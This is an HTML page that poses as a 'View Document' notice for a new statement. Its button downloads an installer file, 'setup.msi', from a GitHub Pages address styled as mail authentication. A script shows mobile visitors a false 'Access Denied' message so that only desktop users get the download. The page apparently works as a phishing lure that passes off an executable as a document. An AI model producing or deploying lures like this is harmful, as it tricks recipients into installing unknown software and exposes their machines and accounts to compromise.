<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Document</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f4f4f4;
            margin: 0;
        }
        h1 {
            color: #333;
        }
        p {
            color: #666;
        }
        a {
            text-decoration: none;
        }
        button {
            background-color: #007BFF;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #0056b3;
        }
        .warning {
            color: red;
            font-size: 18px;
            margin-top: 20px;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div id="desktopContent" class="hidden">
        <h1>New Document available</h1>
        <p>Click the button below to download the setup MSI file.</p>
        <a href="https://mailaol254.github.io/mailauth/setup.msi" download>
            <button>View Document</button>
        </a>
    </div>
    <div id="mobileWarning" class="hidden">
        <h1>Access Denied</h1>
        <p>This statement file is only available for download on a laptop or desktop computer. To continue, please use a laptop or desktop computer.</p>
    </div>
    <script>
        function checkDevice() {
            var userAgent = navigator.userAgent;
            var isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(userAgent);
            if (isMobile) {
                document.getElementById('mobileWarning').classList.remove('hidden');
            } else {
                document.getElementById('desktopContent').classList.remove('hidden');
            }
        }

        window.onload = checkDevice;
    </script>
</body>
</html>
